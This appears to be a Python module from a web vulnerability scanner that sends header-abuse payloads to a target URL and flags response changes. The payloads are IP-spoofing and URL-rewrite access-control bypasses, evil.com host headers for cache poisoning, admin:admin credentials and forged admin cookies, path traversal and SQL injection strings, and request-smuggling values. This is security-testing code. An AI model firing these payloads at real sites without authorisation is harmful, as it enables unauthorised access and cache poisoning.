# Header Injection Abuse.Py Module

import requests
from . import get_session

# Header injection abuse focuses on exploiting header handling in web applications
# beyond basic CRLF injection

# Advanced header injection abuse payloads
HEADER_ABUSE_PAYLOADS = [
    # Security bypass through header manipulation
    {"header": "X-Originating-IP", "value": "127.0.0.1"},
    {"header": "X-Forwarded-For", "value": "127.0.0.1"},
    {"header": "X-Remote-IP", "value": "127.0.0.1"},
    {"header": "X-Remote-Addr", "value": "127.0.0.1"},
    {"header": "X-ProxyUser-Ip", "value": "127.0.0.1"},
    {"header": "X-Original-URL", "value": "/admin"},
    {"header": "X-Rewrite-URL", "value": "/admin"},
    {"header": "X-Custom-IP-Authorization", "value": "127.0.0.1"},
    
    # Cache poisoning through headers
    {"header": "X-Host", "value": "evil.com"},
    {"header": "X-Forwarded-Host", "value": "evil.com"},
    {"header": "X-Forwarded-Server", "value": "evil.com"},
    
    # Content-Type manipulation
    {"header": "Content-Type", "value": "application/json;charset=utf-7"},
    {"header": "Content-Type", "value": "text/html;charset=utf-8"},
    
    # Authentication bypasses
    {"header": "Authorization", "value": "Basic YWRtaW46YWRtaW4="},  # admin:admin in Base64
    {"header": "Cookie", "value": "admin=true; authenticated=true; role=admin"},
    
    # WAF bypass techniques
    {"header": "Accept", "value": "../../../etc/passwd{{"},
    {"header": "Accept-Language", "value": "en-US,en;q=0.5) AND 1=1 --"},
    
    # HTTP Request smuggling
    {"header": "Transfer-Encoding", "value": "chunked, identity"},
    {"header": "Connection", "value": "keep-alive, Transfer-Encoding"},
    
    # Custom headers that might be processed by the application
    {"header": "X-API-Version", "value": "null"},
    {"header": "X-API-Key", "value": "null' OR '1'='1"},
]

def check(target_url, session=None):
    req_session = get_session(session)
    findings = []
    
    # Get baseline response
    try:
        r_baseline = req_session.get(target_url, timeout=5)
        baseline_status = r_baseline.status_code
        baseline_length = len(r_baseline.text)
        baseline_headers = r_baseline.headers
    except Exception:
        return findings
        
    # Test each payload
    for payload in HEADER_ABUSE_PAYLOADS:
        try:
            r = req_session.get(target_url, headers={payload["header"]: payload["value"]}, timeout=5)
            
            # Look for significant changes in response
            
            # 1. Status code changes (particularly interesting for authorization bypass)
            if r.status_code != baseline_status:
                findings.append(f"Header abuse - status code changed from {baseline_status} to {r.status_code}: {payload['header']}:{payload['value']}")
                
            # 2. Significant response size changes
            if abs(len(r.text) - baseline_length) > 50:  # Threshold of 50 characters
                findings.append(f"Header abuse - response size changed when using: {payload['header']}:{payload['value']}")
                
            # 3. New cookies or headers in response
            for header, value in r.headers.items():
                if header not in baseline_headers or baseline_headers.get(header) != value:
                    findings.append(f"Header abuse - new/changed response header: {header}:{value} when using {payload['header']}")
                    
            # 4. Look for authentication/admin access indicators
            admin_indicators = ["admin panel", "dashboard", "control panel", "administrator", "logged in", "welcome back"]
            if any(indicator in r.text.lower() for indicator in admin_indicators) and \
               not any(indicator in r_baseline.text.lower() for indicator in admin_indicators):
                findings.append(f"Potential access control bypass using header: {payload['header']}:{payload['value']}")
                
            # 5. Look for error messages that might indicate successful injection
            error_indicators = ["sql syntax", "error", "exception", "stack trace", "warning"]
            if any(indicator in r.text.lower() for indicator in error_indicators) and \
               not any(indicator in r_baseline.text.lower() for indicator in error_indicators):
                findings.append(f"Header abuse triggered error: {payload['header']}:{payload['value']}")
                
        except Exception:
            continue
            
    return findings
